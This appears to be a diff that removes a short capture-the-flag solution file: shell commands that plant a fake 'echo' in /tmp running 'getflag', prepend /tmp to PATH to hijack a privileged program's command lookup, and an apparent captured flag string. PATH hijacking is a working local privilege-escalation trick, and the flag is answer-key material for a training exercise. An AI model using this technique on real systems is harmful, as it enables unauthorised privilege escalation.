@@ -1,6 +1,0 @@
-echo getflag > /tmp/echo
-chmod +x /tmp/echo
-
-export PATH=/tmp:$PATH
-
-qi0maab88jeaj46qoumi7maus
